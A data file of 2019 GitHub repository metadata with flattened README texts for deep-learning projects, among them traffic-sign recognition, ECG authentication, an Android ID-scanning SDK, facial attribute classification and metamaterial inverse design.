ricardoschwarz,SpeedLimit_DL,n/a,SpeedLimitDL A deep learning project that aims to estimate the current speedlimit from a front camera video feed TODO CNNs are trained from the German Trafic Sign Dataset from https sid erda dk public archives daaeac0d7ce1152aea9b61d9f1e19370 published archive html The dataset structure should be data train 00000 0000000000 ppm 0000000001 ppm Labels of all classes Nr Label 00000 SpeedLimit 20 00001 SpeedLimit 30 00002 SpeedLimit 50 00003 SpeedLimit 60 00004 SpeedLimit 70 00005 SpeedLimit 80 00006 End of SpeedLimit 80 00007 End of SpeedLimit 100 00008 SpeedLimit 120 00009 No overtaking allowed for cars 00010 No overtaking allowed for trucks 00011 Right of way at next junction 00012 Right of way on this road 00013 Yield right of way 00014 Stop Yield right of way 00015 All vehicles banned for this road 00016 All trucks banned for this road 00017 No Entry 00018 Danger Spot 00019 Sharp Left Corner 00020 Sharp Right Corner 00021 Double Curve 00022 Uneven Road 00023 Slip Hazard 00024 Road narrows 00025 Roadworks 00026 Traffic Light 00027 Pedestrians 00028 Children 00029 Cyclists 00030 Slipperiness 00031 Deer Path 00032 End of all constraints 00033 Prescribed driving direction right 00034 Prescribed driving direction left 00035 Prescribed driving direction ahead 00036 Prescribed driving direction ahead and right 00037 Prescribed driving direction ahead and left 00038 Prescribed passing at the right side 00039 Prescribed passing at the left side 00040 Roundabout 00041 Overtaking is now allowed 00042 Overtaking is now allowed for trucks,2019-08-12T20:03:22Z,2019-08-18T21:44:25Z,Python,ricardoschwarz,User,1,1,0,18,master,ricardoschwarz,1,0,0,0,0,0,0
IkePCampbell,OthelloAI,n/a,OthelloAI Purpose A barebones working CLI version of Othello for implementing Neural Networks or Deep Learning etc Implemented Basic 2 Player Game Being able to replay game Random Agent Player vs Player and Player vs Random Agent Need to Implement AI for player vs computer Way that I will collect Data in order to optimize Neural Network Neural Network AI vs AI Backend for collecting storing Data,2019-09-12T16:28:48Z,2019-10-26T21:08:06Z,Python,IkePCampbell,User,1,1,0,4,master,IkePCampbell,1,0,0,0,0,0,0
jmuskaan72,fashion-items-classificastion,n/a,fashion items classificastion Using Deep Learning techniques I have classified a fashion immanence data into 10 labels The global fashion industry is valued at three trillion dollars and accounts for 2 percent of the world s GDP The fashion industry is undergoing a dramatic transformation by adopting new computer vision and machine learning and deep learning techniques In this case study we ll look at a hypothetical situation We assume that if a retailer hired you to build a virtual stylist assistant that looks at customer Instagram the virtual assistant can help the retailer detect and forecast fashion trends and launch targeted marketing campaigns In this story we re going to use the fashion immanence data It s a data set that contains images of bags shoes and dresses And we re asking the deep network to classify the images into 10 classes,2019-08-20T16:06:15Z,2019-09-15T13:51:27Z,Jupyter Notebook,jmuskaan72,User,1,1,0,5,master,jmuskaan72,1,0,0,0,0,0,0
HarneetKaurr,TwitterChatBot,n/a,,2019-08-08T05:34:39Z,2019-09-24T20:04:02Z,Python,HarneetKaurr,User,1,1,0,0,master,,0,0,0,0,0,0,0
billyporter,nnmultivariate,n/a,,2019-08-07T19:23:45Z,2019-08-25T19:05:42Z,Python,billyporter,User,1,1,0,1,master,billyporter,1,0,0,0,0,0,0
colathro,highcard.ai,n/a,minimal flask react Based on https github com rwieruch minimal react webpack babel setup Run Locally 1 Clone this repo git clone git github com jwkvam minimal flask react git 2 npm install 3 npm run dev 4 pip install r requirements txt 5 python server py 6 Goto http localhost 3000 If you would like to have webpack rebuild your javascript any time your React code changes enter npm run start in a different terminal,2019-09-13T22:58:39Z,2019-10-23T14:36:59Z,Python,colathro,User,1,1,0,13,master,colathro,1,0,0,0,0,0,0
HelenShao,ML_DM_HI,n/a,,2019-08-09T20:41:18Z,2019-10-21T07:02:31Z,Python,HelenShao,User,1,1,0,35,master,HelenShao#franciscovillaescusa,2,0,0,0,0,0,0
amanbasu,ECG-Authentication,n/a,ECG Authentication https github com amanbasu ECG Authentication blob master images result png ECG is the depiction of the electric signals that come from the expansion and contraction of heart muscles indirectly the flow of blood inside the heart It depends on the anatomy and physiology of the heart which can vary with age gender and myriad of other factors And the most fascinating part is that it doesn t change over time for an individual not even when the heart beats increase or decrease This repository contains the code of developing a Deep Learning model to identify individuals based on their ECG signals Its has been developed using Keras and TensorFlow and hosted on the Google Cloud Platform for deployment Data The data has been taken from ECG ID Database The database contains 310 ECG recordings obtained from 90 persons Each recording contains ECG lead I recorded for 20 seconds digitized at 500 Hz with 12 bit resolution over a nominal 10 mV range 10 annotated beats unaudited R and T wave peaks annotations from an automated detector information in the hea file for the record containing age gender and recording date The records were obtained from volunteers 44 men and 46 women aged from 13 to 75 years who were students colleagues and friends of the author The number of records for each person varies from 2 collected during one day to 20 collected periodically over 6 months The raw ECG signals are rather noisy and contain both high and low frequency noise components Each record includes both raw and filtered signals Signal 0 ECG I raw signal Signal 1 ECG I filtered filtered signal The data was used to create individual ECG image samples belonging to different people and train the model Model Siamese network was trained on the ECG image dataset to distinguish between the individuals and then hosted on the Google Cloud Platform,2019-09-14T12:01:57Z,2019-10-07T18:25:59Z,Python,amanbasu,User,1,1,1,20,master,amanbasu,1,0,0,0,0,0,0
frslabs,octus-android,android#identity-document#java#mrtd#mrz#ocr#ocr-android#ocr-recognition#optical-character-recognition#pdf417#qrcode-scanner,OCTUS SDK version https img shields io badge version v2 0 7 blue Octus SDK uses advanced deep learning technologies for accurate and fast ID scanning and OCR Businesses can integrate the Octus SDK into native Android Apps which comes with pre built screens and configurations The SDK returns the scanned images extracted data and error codes And as a safety measure the SDK does not store any of the personal data or ID images that are scanned For the list of supported documents per country refer to Octus Country Specific Supported Documents SUPPORTEDDOCUMENTBYCOUNTRY md You can find the release history at Changelog CHANGELOG md Table Of Content Prerequisite prerequisite Android SDK Requirements android sdk requirements Download download Using maven repository using maven repository Setup setup Permissions permissions Proguard rules proguard rules Quick Start quick start Initiating the Octus scanner initiating the octus scanner Handling the result handling the result Octus Result octus result Octus Error Codes octus error codes Octus Parameters octus parameters Help help Prerequisite You will need a valid license to use the Octus SDK which can be obtained by contacting support frslabs com Depending on the license offline or online you have opted for the ping functionality to billing servers will be disabled or enabled For instance if you have opted for the offline SDK model then there will be no server ping needed to our billing server to bill you However if you have chosen a transaction based pricing then after each transaction a ping request will be made to our billing server This cannot be overrided by the App A point to note is that if the ping transaction fails for any reason the whole transaction will be void without any results from the SDK Once you have the license follow the below instructions for a successful integration of Octus SDK onto your Android Application Android SDK Requirements Minimum SDK Version 16 Ice Cream Sandwich or higher Compile SDK Version 28 or higher Download Using maven repository Add the following code to your project level build gradle file groovy allprojects repositories google jcenter Maven credentials for the Octus SDK maven URL for Octus SDK url https octus android repo frslabs space credentials username repo username password repo password Include below code only for transaction based billing Maven credentials for the Torus SDK maven url https torus android repo frslabs space credentials username password After that add the following code to your app level build gradle file groovy defaultConfig ndk abiFilters armeabi v7a arm64 v8a x86 x8664 vectorDrawables useSupportLibrary true renderscriptTargetApi 21 renderscriptSupportModeEnabled false And then add the dependencies groovy dependencies Dependencies for Octus SDK implementation com android support design implementation com android support constraint constraint layout Octus Core Dependency implementation com frslabs android sdk octus 2 0 7 Octus Additional Depedencies implementation com gemalto jp2 jp2 android 1 0 implementation com rmtheis tess two 9 1 0 implementation com google android gms play services vision 15 0 0 Optional Required if transaction based billing is enabled Octus billing dependencies implementation com frslabs android sdk torus 0 1 0 implementation com google code gson gson 2 8 5 Setup Permissions Octus requires the camera permission to initiate its scanner xml Quick Start Initiating the Octus scanner Initialize the Octus instance with the appropriate configurations to invoke the Octus Sdk java public class MainActivity extends AppCompatActivity implements OctusResultCallback Enter the Octus license key here private String OCTUSLICENSEKEY Override protected void onCreate Bundle savedInstanceState super onCreate savedInstanceState setContentView R layout activitymain Button callSdk findViewById R id callsdk callSdk setOnClickListener new View OnClickListener Override public void onClick View view Invoke the Octus Sdk callOctusSdk private void callOctusSdk try Initialize the Octus Sdk Config object with the appropriate configurations OctusConfig octusConfig new OctusConfig Builder setLicenseKey OCTUSLICENSEKEY showInstruction false setScanMode Utility ScanMode AUTO dataPointsAll false orientationFlat false setScanAlertType Utility Alert VIBRATION setLanguage Utility Language EN setDocumentCountry Country IN setDocumentType Document VID setDocumentSubType Utility SubType OCR setDocumentSide Utility Side FRONTBACK aadhaarNumberMasked false build Call the Octus Sdk to start scanning Octus setSdkConfig octusConfig enableLogs initialise this this Pass the main context here catch OctusInitException e Handle exception here e printStackTrace For all parameters and their possible values refer Octus Parameters octus parameters Handling the result Your activity must implement OctusResultCallback to receive the result java Override public void onScanSuccess OctusResult octusResult Handle the Octus Sdk result here Log d OctusSdk Result octusResult toString Override public void onScanFailure String errorCode Handle the Octus Sdk failure result here Toast makeText this Error errorCode Toast LENGTHSHORT show For all errorCode s and their meanings refer Octus Error Codes octus error codes Octus Result Result of the scan is obtained from the OctusResult instance Complete Octus result is given below java Override public void onScanSuccess OctusResult octusResult Handle the Octus Sdk result here Log d OctusSdk Result octusResult toString Below values are given for ID card with MRTD without MRTD String code octusResult getCode String documentType octusResult getDocumentType String name1 octusResult getName1 String name2 octusResult getName2 String idNumber1 octusResult getDocumentNumber1 String idNumber2 octusResult getDocumentNumber2 String dob octusResult getDateOfBirth String expiry octusResult getExpiryDate String gender octusResult getGender String address1 octusResult getAddress1 String address2 octusResult getAddress2 String address3 octusResult getAddress3 String address4 octusResult getAddress4 String city octusResult getCity String state octusResult getState String idCountry octusResult getCountry String idIssCountry octusResult getIssuingCountry Below values gives the Document Image path String idFacePath octusResult getFace String idFrontPhotoPath octusResult getPhoto1 String idBackPhotopath octusResult getPhoto2 Below values are applicable to Cheque Leaf India only String bankAccountNumber octusResult getBankAccountNumber String bankAccIfsc octusResult getBankIfsCode String gstn octusResult getGSTN Below values are applicable to Voter ID India only String frontConfidenceScore octusResult getConfidenceIndexF String backConfidenceScore octusResult getConfidenceIndexB String frontIdOcrStatus octusResult getFrontIdScanStatus String backIdOcrStatus octusResult getConfidenceIndexB Below values are applicable to Aadhaar Card India only String aadhaarMaskStatus octusResult getAadhaarMaskStatus Below values are applicable to MRTD supported documents only String isMRZChecksumValidated octusResult getMrzChecksumValidityStatus Given below are some public methods of OctusResult in brief Public Methods String getAadhaarMaskStatus Gets the Aadhaar number masking status Possible values are XX BOTH SIDES ALREADY MASKED YY BOTH SIDES MASKED YN FRONT MASKED BACK NOT MASKED NN BOTH SIDES NOT MASKED Octus Error Codes Error codes and their meaning are tabulated below Code Message 801 Scan timed out 802 Invalid ID parameters passed 803 Camera permission denied 804 Scan was interrupted 805 Octus SDK License got expired 806 Octus SDK License was invalid 807 Invalid camera resolution 811 QR not detected 812 QR parsing failed 108 Internet Unavailable 401 Api Limit Exceeded 429 Too many request Octus Parameters setLicenseKey String octusLicenseKey Required Accepts the Octus licence key as a String setScanMode Utility ScanMode scanMode Required Sets the scanning mode Value Effect Utility ScanMode AUTO Automatically starts scanning as soon as camera preview is ready Utility ScanMode MANUAL Displays a button used to start the scan when clicked setDocumentType Document documentType Required Sets the Document which has to be scanned Possible values are Value Effect Document PAN Pan Card Document ADR Aadhaar Card Document VID Voter ID Document NID National ID Document PPT Passport Document VSA Visa Document DRV Driving Licence Document CQL Cheque Leaf Document SSN Social Security Number Document FRM16 Form 16 Document GST GST Form Document IMGADR Image Capture Aadhaar Document IMGANY Plain Image capture setDocumentCountry Country country Required Sets the country associated with the Document For the complete list of supported countries refer Country Parameters COUNTRYPARAMETERS md setDocumentSubType Utility SubType subType Required Sets the Document Sub Type Majority of the documents support only Utility SubType OCR as a sub type Documents where both Utility SubType OCR and Utility SubType QRCODE apply are Document ADR Document DRV Documents where both Utility SubType MRZ and Utility SubType OCR apply are Document NID Documents where only Utility SubType MRZ apply are Document PPT Document VSA Documents where only Utility SubType PDF417 apply are Document DRV For Country NG Document VID For Country NG Possible values for Sub Type are Value Effect Utility SubType OCR Scans the document in OCR mode Utility SubType QRCODE Scans the document in QR mode Utility SubType MRZ Scans the document in MRZ mode Utility SubType PDF417 Scans the document in PDF417 mode setLanguage Utility Language language Optional Defaults to Utility Language EN Sets the language associated with the Document Possible values are Value Effect Utility Language EN English Utility Language FR French Utility Language ES Spanish Utility Language AR Arabic Utility Language HI Hindi showInstruction boolean show Optional Defaults to false Sets flag to enable disable the instruction screen prior to scanning Possible values are Value Effect true Enables the instruction screen false Disables the instruction screen setScanAlertType Utility Alert alertType Optional Defaults to Utility Alert SOUNDVIBRATION Sets the alert type when the sdk returns the result Value Effect Utility Alert SOUND Triggers a beep sound after the scan completes Utility Alert VIBRATION Triggers a mild haptic response Vibration alerting after scan completes Utility Alert NONE Disables any feedback on scan being completed Utility Alert SOUNDVIBRATION Triggers both beep sound and haptic response after scan completes setDocumentSide Utility Side documentSide Optional Defaults to Utility Side FRONTBACK Sets the value of the document side to be scanned Value Effect Utility Side FRONT Scans only the Front Primary side of the document Utility Side BACK Scans only the Back Secondary side of the document Utility Side FRONTBACK Scans both Front and back side of the document dataPointsAll boolean dataPointCategory Optional Defaults to false Sets the flag to set the data point category Value Effect true Provides the scan result only if all data points are found false Provides the scan result if atleast one of the data points are found orientationFlat boolean isOrientationFlat Optional Defaults to false Sets the value for which the scanner should lock the orientation with respect to the scan surface Possible values are Value Effect true Scans only when orientation of the phone camera is perpendicular flat to the scan surface false Scans ignoring the orientation of the phone camera to the scan surface aadhaarNumberMasked boolean numberMasked Optional Defaults to false Applies ONLY to Document ADR and COUNTRY IN Sets the flag to enable disable aadhaar number masking Value Effect true Masks the aadhaar number in the scan result image false disables masking the aadhaar number in the scan result Help For any queries feedback contact us at support frslabs com,2019-08-30T07:18:33Z,2019-12-06T08:00:42Z,n/a,frslabs,Organization,1,1,0,23,master,devteam-frslabs,1,0,0,0,0,0,0
ethereon,merlin,deep-learning#machine-learning#tensorflow,Merlin A deep learning toolkit using TensorFlow 2 and Python 3 7 This is a work in progress Read the design document design md See some illustrative examples examples See some real world examples https github com ethereon alchemy A relatively recent nightly build of TensorFlow v2 https pypi org project tf nightly gpu 2 0 preview is required for Merlin although the beta https www tensorflow org beta should mostly work,2019-08-14T21:37:15Z,2019-08-17T21:14:03Z,Python,ethereon,User,3,1,0,4,master,ethereon,1,0,0,0,0,0,0
kxl4126,MountainCarDQN,n/a,MountainCarDQN Implementing a Deep Neural Network with Q Learning to solve Open AI Gym MountainCar environment,2019-09-19T09:34:38Z,2019-12-13T11:29:09Z,Python,kxl4126,User,1,1,0,6,master,kxl4126,1,0,0,0,0,0,0
budvinchathura,nn-basics,n/a,,2019-08-11T12:57:38Z,2019-10-03T12:21:44Z,Python,budvinchathura,User,1,1,0,21,master,budvinchathura,1,0,0,0,0,0,0
kashish2803,Twizz,n/a,Twizz A simple flask application that classifies sentiments of tweets using deep learning and NLP For demo http twizz herokuapp com Requirements 1 Flask pip install flask 2 NLTK pip install nltk 3 TextBlob pip install textblob 4 Tweepy pip install tweepy Usage 1 Clone the project repository git clone https github com kashish2803 Twizz 2 Create a twitter developer account by going on to https developer twitter com 3 Create an app and generate consumerkey consumersecret accesstoken accesstoken secret 4 Paste those credentials in twitter py file Run python app py,2019-08-13T09:06:44Z,2019-08-24T10:35:07Z,Python,kashish2803,User,1,1,0,13,master,kashish2803,1,0,0,0,0,0,0
probhakarroy,tcs_humain_challenge,n/a,Facial Recognition Deep Multi Task Learning Network For Emotion Age Ethnicity Classification Created For TCS HumAIn Challenge Homepage https probhakarroy github io tcshumainchallenge Install Dependancy pip3 install upgrade r requirements txt Usage python3 model py help usage model py h predict evaluate train epoch EPOCH epochweight EPOCHWEIGHT Multi Task Learning Network optional arguments h help show this help message and exit predict Use the model to predict an image from path or url evaluate Evaluate the model train Train the model epoch EPOCH No of Epochs Default 50 epochweight EPOCHWEIGHT Load the weight from trained epoch Choices 23 26 49 50 Default 50 A Deep Multi Task Learning Network For Emotion Age Ethnicity Classification trained using the dataset provided by TCS of 120 labeled images FaceRecognition json using TensorFlow Dataset The dataset was provided by TCS HumAIn in a JSON File The dataset generator script datasetgenerator py in modelutils is used to parse the json file and download the images then reshape and covert them to tf Tensor of shape 299 x 299 x 3 and also parse the labels and encode them to one hot vectors Some Data Samples modeldata samples 1 jpeg modeldata samples 2 jpeg Two datapoints out of 120 datapoints cannot be decoded using TensorFlow hence 118 images were processed with tensorflow and then data augmented to produce 472 datapoints and then used to create three tf data Dataset input pipeline for training validation and testing of the tensorflow model Total no of datapoints after data augmentation 472 Total no of datapoints in train set 354 Total no of datapoints in validation set 94 Total no of datapoints in test set 23 Classes sh Emotion EmotionNeutral NotFace EmotionSad EmotionAngry EmotionHappy Age Ageabove50 Age3040 Age2030 Age4050 Agebelow20 others Ethnicity EHispanic EWhite EBlack EAsian EIndian others Model Architecture modeldata model png Training The model was trained on Google Colab using Nvidia Tesla T4 GPU Usage Script sh python3 model py train OR python3 model py train epoch 50 Some Epoch Metrics Epoch 1 50 21 22 ETA 1s loss 6 2680 emotionsloss 1 4739 ageloss 1 7252 ethinicityloss 1 5602 emotionsaccuracy 0 3333 ageaccuracy 0 2470 ethinicityaccuracy 0 3929 Epoch 00001 saving model to tcsfrweights weights 01 h5 22 22 39s 2s step loss 6 2826 emotionsloss 1 4719 ageloss 1 7199 ethinicityloss 1 5878 emotionsaccuracy 0 3438 ageaccuracy 0 2528 ethinicityaccuracy 0 3835 valloss 5 8135 valemotionsloss 1 4673 valageloss 1 5578 valethinicityloss 1 4182 valemotionsaccuracy 0 1875 valageaccuracy 0 4375 valethinicityaccuracy 0 5000 Epoch 23 50 21 22 ETA 1s loss 1 1570 emotionsloss 0 1428 ageloss 0 2857 ethinicityloss 0 1560 emotionsaccuracy 0 9554 ageaccuracy 0 9167 ethinicityaccuracy 0 9673 Epoch 00023 saving model to tcsfrweights weights 23 h5 22 22 38s 2s step loss 1 1737 emotionsloss 0 1398 ageloss 0 2891 ethinicityloss 0 1723 emotionsaccuracy 0 9574 ageaccuracy 0 9148 ethinicityaccuracy 0 9602 valloss 3 0625 valemotionsloss 0 7331 valageloss 0 9864 valethinicityloss 0 7717 valemotionsaccuracy 0 6875 valageaccuracy 0 8125 valethinicityaccuracy 0 8125 Epoch 49 50 21 22 ETA 1s loss 0 9638 emotionsloss 0 1036 ageloss 0 1933 ethinicityloss 0 1210 emotionsaccuracy 0 9643 ageaccuracy 0 9583 ethinicityaccuracy 0 9881 Epoch 00049 saving model to tcsfrweights weights 49 h5 22 22 39s 2s step loss 0 9751 emotionsloss 0 1055 ageloss 0 1942 ethinicityloss 0 1297 emotionsaccuracy 0 9631 ageaccuracy 0 9574 ethinicityaccuracy 0 9830 valloss 3 4741 valemotionsloss 0 8931 valageloss 1 2171 valethinicityloss 0 8187 valemotionsaccuracy 0 6875 valageaccuracy 0 6875 valethinicityaccuracy 0 8125 Epoch 50 50 21 22 ETA 1s loss 0 9500 emotionsloss 0 1099 ageloss 0 1817 ethinicityloss 0 1136 emotionsaccuracy 0 9643 ageaccuracy 0 9732 ethinicityaccuracy 0 9851 Epoch 00050 saving model to tcsfrweights weights 50 h5 22 22 39s 2s step loss 0 9638 emotionsloss 0 1094 ageloss 0 1861 ethinicityloss 0 1237 emotionsaccuracy 0 9631 ageaccuracy 0 9688 ethinicityaccuracy 0 9801 valloss 3 7255 valemotionsloss 0 9669 valageloss 1 2879 valethinicityloss 0 9266 valemotionsaccuracy 0 6875 valageaccuracy 0 6875 valethinicityaccuracy 0 7500 Model Metrics modeldata metrics 1 jpg modeldata metrics 2 jpg modeldata metrics 3 jpg modeldata metrics 4 jpg modeldata metrics 5 jpg Saved trained epoch weights of the model with best validation accuracies for the epoch 23 26 49 50 can be found in modeldata weights folder Validation Best Validation Accuracy for the model for Epoch 23 sh Emotion Accuracy 68 75 Age Accuracy 81 25 Ethnicity Accuracy 81 25 Evaluate Usage Script sh python3 model py evaluate OR python3 model py evaluate epochweight 50 Test Metrics for the model with best epoch weights python3 model py evaluate Loading the links 100 120 120 00 00 00 00 268722 09it s Downloading the images and converting them to tf tensors 100 119 119 02 11 00 00 1 11s it Data Augmentations 100 118 118 00 01 00 00 97 08it s Total no of datapoints after data augmentation 472 Total no of datapoints in train set 354 Total no of datapoints in validation set 94 Total no of datapoints in test set 23 23 23 2s 71ms step loss 5 9781 emotionsloss 1 5415 ageloss 1 9576 ethinicityloss 1 9338 emotionsaccuracy 0 6522 ageaccuracy 0 5217 ethinicityaccuracy 0 5652 Prediction Usage Script sh python3 model py predict OR python3 model py predict epochweight 50 Sample Prediction of the model sh python3 model py predict Enter Image Path Url http com dataturks a96 i23 open s3 amazonaws com 2c9fafb06477f4cb0164895548a600a3 66127d05 93eb 498f bac3 85a19bcbbbc72538464 mainimage jpg jpeg Downloading the image and converting it to tf tensors Prediction predicted emotion EmotionHappy predicted age Agebelow20 predicted ethinicity EWhite Output Screen modeldata prediction pred1 png sh python3 model py predict Enter Image Path Url http com dataturks a96 i23 open s3 amazonaws com 2c9fafb06477f4cb0164895548a600a3 e3f39fd4 8888 4eea a49d 038f70a8c540instagram famous clothing stores jpg jpeg Downloading Opening the image and converting it to tf tensors Prediction predicted emotion EmotionHappy predicted age Age2030 predicted ethinicity EHispanic Output Screen modeldata prediction pred2 png sh Tested In Ubuntu 19 04 with Python 3 7 3,2019-08-15T09:58:46Z,2019-10-17T09:02:33Z,Python,probhakarroy,User,1,1,1,60,master,probhakarroy,1,2,2,0,0,0,4
gully,pytorchHackathon,astronomical-data-analysis#deep-learning#kepler#pytorch#pytorch-summer-hackathon#time-series,pytorchHackathon PyTorch Summer Hackathon for astronomical data analysis Themes astronomy Kepler K2 pytorch time series probabilistic data analysis Gaussian Processes torch audio Links GPyTorch https gpytorch ai celerite celerite readthedocs io Keper K2 https keplerscience arc nasa gov Google Astro Net tensorflow https github com google research exoplanet ml ExoNet Data and ancillary files https github com hposborn exonettess ExoNet GitLab Code https gitlab com frontierdevelopmentlab exoplanets Exonet Paper1 https arxiv org abs 1810 13434 Exonet Paper2 https arxiv org abs 1902 08544 Download all TESS Sector 12 TCEs http archive stsci edu tess bulkdownloads bulkdownloadstce html,2019-08-08T18:20:38Z,2019-08-09T19:02:35Z,Jupyter Notebook,gully,User,3,1,0,15,master,gully#GrantRVD,2,0,0,1,0,0,0
fraunhofer-iais,UoC-ml-school-2019,n/a,A Practical Introduction to Automatic Audio Segmentation Using Deep Learning In Proceedings of Summer School Deep Learning for Language Analysis September 2019 http ml school uni koeln de Goal Train a deep neural network on VGGish https github com tensorflow models tree master research audioset audio features to automatically segment an audio file into speech and non speech parts Setup Please follow the instructions below in order 1 Install and setup the following 1 docker https docs docker com install 2 git https git scm com downloads 2 Clone this repository Or download it if you don t have git 3 Start Docker on your machine Check in Docker settings if appropriate sharing of drive is setup Check in Docker settings if appropriate CPU RAM limits are setup 4 Build a docker image Terminal on Linux macOS or Powershell on Windows bash change directory to the clone if not already replace below with where you cloned this repository cd UoC ml school 2019 Build a docker image docker build tag uoc 2019 PWD 5 Run a docker container with the built image serving a Jupyter Lab https jupyterlab readthedocs io en stable instance bash assuming you are in UoC ml school 2019 directory run the created image exposing Jupyter Lab port to 8888 and mounting the current directory inside the container docker run it p 8888 8888 v PWD ml school uoc 2019 jupyter lab 6 Open the served Jupyter Lab instance in the browser by following instructions in the terminal There will be a URL in the terminal that you can copy and then paste in the browser 7 Check setup by opening and following the instructions 00 check setup ipynb,2019-09-12T05:01:43Z,2019-09-12T08:21:15Z,Python,fraunhofer-iais,Organization,3,1,0,2,master,motjuste,1,0,0,0,0,0,0
mattthelee,MSc-Project,n/a,MSc Project Final AI MSc Project using Genetic Programming and Deep Learning to play Minecraft Requirements Must have a GPU 16 Gb RAM Java 1 8 Python 3 6 6 If running headlessly i e on a server without a display then you must have xvfb or similar renderer installed OpenGL libraries for Minecraft 1 11 must be installed Installation 1 Install Python modules with pip install r requirements txt 2 Install PyTPG by following instructions here https github com Ryan Amaral PyTPG N B You must use version 0 8 of TPG 3 Install MineRL its dataset and dependencies following http minerl io docs tutorials index html Running TPG on MineRL To run the basic experiment on MineRL Navigate dense task python tpgAgent py o N B Running with default settings is time consuming therefore it is recommended to run as background job Background task can be started on linux with nohup xvfb run python tpgAgent py tpgLogs out If running headlessly then prepend with xvfb run or your chosen software renderer xvfb run python tpgAgent py Run tpgAgent py h to see full list of options available including environments step limits and resuming from pretrained population At the end of each generation the TPG population is saved to output folder set by o option This can be resumed from this file by a subsequent run with the same parameters and the r option Summary results are written to a local csv file TPG on Imitation Environment To train TPG population on the MineRL human dataset use the u option followed by the number of examples to use E g python tpgAgent py u 10000 A limit of 10000 is recommended to avoid memory issues VAE To train the Variational Auto Encoder VAE run python vae py To see available options run python vae py h,2019-08-21T12:27:03Z,2019-11-25T17:17:04Z,Jupyter Notebook,mattthelee,User,1,1,0,8,master,mattthelee,1,0,0,1,0,2,0
BensonRen,idlm_Ben,n/a,idlmBen This project is for the problem of inverse mapping for meta material design using deep learning Special thanks for Bohao Huang https github com bohaohuang and Christian nadell https github com chnadell for infrastructure of the code The previous version for the forward mapping learning can be found following this link https github com chnadell dlmCN Developer Log Real Dataset 2019 06 19 Background This is modified code from BoHao and the forward model The backward model is now fully implemented to be tested on the real data set The original settings of this code was separated files each with different funcitons Here within this notebook those files would be separated by sections and each sections would be defined before calling them 2019 06 21 Attempts made to integrate the backward model with the forward model checkpoint file provided by Christian 3 methods were attempted including direct import failed because of static graph definition import from name failed because of uncertain graph name definition model extraction method failed due to incompatibility of tensorflow graph and keras model instaintiation which still comes from an unknown source 2019 06 24 As dicussed with Jordan on Friday the forward model actually costs such little time to train therefore the new current method would be writing our own forward model and train the related parameters However now lets try the 4th attempt for restoring ckpt files restore form meta files and run session to import the weights 2019 06 27 After trail runs the 4th method of building the graph from meta file succeed Therefore we can spare the time for re training a forward model Module retrieve forward model is added to retrieve the forward model Only the input and output tensor are instaintiated for convenience However this doesn t work for changing the tensors to be trainable and therefore this is abandoned The tandem structure direct construction method is re activated 2019 07 31 2019 06 27 2019 07 28 Vacation Time 2019 07 29 Add collection control on the variables created in the tandem structure so that trainable property can be set on and off by the collection name The algorithm is working now Minor problem 1 The training hook of forward and tandem structure is in the same place Fixed 08 04 2019 08 04 Now the goal is to validate the various methods for dealing the inverse problem Highlight means working now rest are pending 1 Tadem structure Done 2 Back propagation Done 3 Variational Auto Encoder VAE 4 Generative Adverserial Network GAN Infrastructures added 1 Spectrum plot for comparing real and predicted structure 2 Evaluate Module added 2019 08 05 refining the tandem structure Infrastructure Added 1 Geometry plot with color bar indicating the error 2 Loading from existing ckpt and train from there 3 Boundary loss implementation Testing 2019 08 06 Boundary loss showing a little wired behavior continue testing on it Infrastructure added 1 Customized summary name 2 Symmetric Awareness Distance metric Thinking 2019 08 09 The tandem training loss is higher than expected Normalizing the input geomery space for further investigation 2019 08 11 Input normalization done however during analysis the tandem structure did not learn effective output Bug fixed added function 1 partial normalization problem 2 Plot boundary problem 2019 08 12 Bug fixed added function 1 Tandem loading pre training forward model and train from the backward model 2 Early stopping Hook 3 NAN stopping Hook 4 Backpropagation input normalization 5 Running Hyper parameter logging Running flags 6 Solved the bug of Hyper parameter logging where only default parameter is recorded Currently the running flags would be recorded to file called parameters txt 2019 08 13 Problem found The tandem structure struggled to learn effective backward representation of the geometry of the material The test accuracy is not significantly higher than the training one which is signifying it is not over fitting but After consulting Evan hyper parameter search for a better architecture would be the first thing worth trying and trend of the training shall be analyzed Bug fixed added function 1 Flag altering training function added to train py in Tandem structure 2 Hyper parameter search module added called hyperswipe py 3 Bug fixed for flag logging would change the original data strcuture for coloumn yrange 4 Bug fixed for flag logging would fail under hyper parameter swiping Now store once one model is trained 5 Random Split for the training and testing data points 2019 08 14 Bug fixed added function 1 Credit to Chrisitan and Bohao added with their personal profile and url linked at README front page 2 VAE structure sub modules Spectraencoder encoder and decoder 2019 08 15 Bug fixed added function 1 VAE model Connection 2 VAE Model maker 3 waitnrun bug for arithmetic expression 4 VAE Loss 5 VAE Testing 2019 08 16 Problem Found Both tandem strcuture as well as the VAE model the testing loss is very high After swiping through model complexity VAE model overfitted and Tandem one just couldn t fit given a long training time Investigation towards proper convolution that deal with spectra is the next step Function Added 1 Tandem model backward convolution customization 2 Tandem model conv1D swiping test 3 MSE REG BDY loss separation summary 4 Hook creation function where you only need to provide the loss names and the loss it returns a list of hook to you 5 Make trace back to lowest loss Hooks 6 Turn off the conv1D and swipe across other architectures pl 1 2019 08 17 Functions Added bug fixed 1 Weight summary system added A new hook has been added to the networkhelper py file and auto added towards the training hooks 2 Bug fixed and weight summary system tested 3 Heat mapping prerequisite done by adding the bestvalidationloss into the parameter txt file 4 HeatMap plotting Done The output parameter storing is changed due to accomondating to the heat map plotting scheme 2019 08 18 Functions Added bug fixed 1 Bug fixed for hyper parameter recording system However the mendal bug has still not yet been fixed 2 Start large scale hyper swiping 3 Bug fixed for plot heat map for tuple eval from str 4 Bug fixed for bestvalidationloss 5 Bug fixed for 2 dimension heat map drawing 2019 08 19 1 Presentation made 2 2D hyper swiping results anaylyzed 3 Hyperswiping for convolution layers and backward layer number 2019 08 20 Problem Found When heavy optimization happens to forward model the backward model found it very hard to find global minima when Forward model is only optimized to 1e 3 tandem can reach 5e 3 But when forward model is optimized to 7 5e 4 tandem can only reach 1 5e 2 This is totally unexpected but very fascinating 2019 08 21 Bug Fixed Funciton added 1 The Evaluation graph did not include the added tconv and used default ones 2 spectra comparison added to presentation slides 3 Hyper swiping the convolution layer to search for better results The forward model over optimization really harms the performance 4 Back propagation multi initialization evaluation and picking the best from the inferance 5 Bug fixed for confusion between boundary and geoboundary should be using geoboundary 2019 08 22 Bug Fixed Funciton added 1 Backpropagation evaluation module finished 2 Learning rate recording in tensorboard summary 2019 08 23 Bug Fixed Function added 1 VAE training updated with klloss monitoring and hooks summary for weights 2 Full batch training swiping and waiting for results 2019 08 24 Bug Fixed Function added 1 Tandem model prediction module 2 Forward model prediction module 